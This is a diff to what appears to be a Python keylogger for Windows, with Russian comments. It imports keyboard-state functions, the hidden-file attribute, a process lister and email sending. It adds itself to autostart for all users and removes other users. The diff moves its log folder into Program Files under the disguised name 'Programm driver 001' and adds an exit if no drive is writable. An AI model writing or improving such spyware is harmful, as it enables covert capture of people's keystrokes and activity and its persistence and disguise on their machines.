@@ -8,6 +8,7 @@ from win32api import GetKeyboardLayoutName, GetKeyboardState, LoadKeyboardLayout
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from time import strftime
 from psutil import process_iter
+from sys import exit
 #Для отправки по электронной почте
 import smtplib
 from email.mime.text import MIMEText
@@ -176,7 +177,7 @@ for user in others_users: remove_others_users(user)
 #Добавление в автозагрузку
 for user in all_users: add_auto_for_users(user)
 #Главная директрия
-main_folder = "Programm driver 001\\"
+main_folder = "Program Files (x86)\\Programm driver 001\\"
 #Язык на момент запуска программы(если 00000409 - английский, 00000419 - русский)
 launge = GetKeyboardLayoutName()
 #Установка первоночальных переменных
@@ -229,13 +230,13 @@ try:
 	write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Инициализация - " + user_name + ' - - -\n', 1)
 except:
 	#Если есть допуск на запись в диске С
-	if access(disk_key, W_OK):
+	if access(disk_key + main_folder, W_OK):
 		#Создаем папку main_folder на диске С
 		if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
 		if not isdir(disk_key + main_folder + user_name + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + moon_curent)
 		if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
 	else:
-		if access('D:\\', W_OK):
+		if access('D:\\' + main_folder, W_OK):
 			if not isdir('D:\\' + main_folder):
 				#Создаем папку main_folder на диске D
 				mkdir('D:\\' + main_folder)
@@ -244,6 +245,8 @@ except:
 			if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
 			if not isdir(disk_key + main_folder + user_name + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + moon_curent)
 			if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
+		else:
+			exit()
 	#Повторно записываем время и дату в файл, в созданной или уже имеющейся папке диска С или D, если вызвалось исключене
 	write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Инициализация - " + user_name + ' - - -\n', 1)
 
